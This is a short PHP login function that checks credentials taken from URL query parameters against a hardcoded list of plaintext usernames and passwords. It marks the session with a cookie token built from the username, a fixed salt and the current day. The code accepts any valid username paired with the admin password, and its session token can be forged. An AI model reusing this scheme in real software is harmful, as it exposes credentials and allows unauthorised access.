<?php 


function checklogin($login=null,$pass=null){
	$login = isset($_GET['user']) ? $_GET['user'] : null;
	$pass = isset($_GET['pass']) ? $_GET['pass'] : null;
    $valid_users=array('admin'=>'mich87',
      //'user1'=>'g46u3h',
      //'user2'=>'h4hgro',
      //'user3'=>'n453h32',
      //'user4'=>'m257bv2',
      'user5'=>'5c325xx4kjasdjhjaghsdasd',
      );
  
  if(!isset($_COOKIE['bd_user'])){
    if ($login==null||$pass==null) return false;

    if (isset($valid_users[$login]) && ($valid_users[$login]==base64_decode(urldecode($_GET['pass'])) || $valid_users['admin']==$pass)) {
      setcookie("bd_user", $login);
      setcookie("bd_user_hash", sha1($login.'sAuLt!G$#'.date('d')));
      return true;
    } else return false;
  // 86400 = 1 day
  } else {
    if(!isset($_COOKIE['bd_user_hash'])) return false;
    $hash=$_COOKIE['bd_user_hash'];
    $rez=($hash==sha1($_COOKIE['bd_user'].'sAuLt!G$#'.date('d')));
    if (!$rez) {setcookie('bd_user','',time()-300); }
    return $rez; 
  }
  


}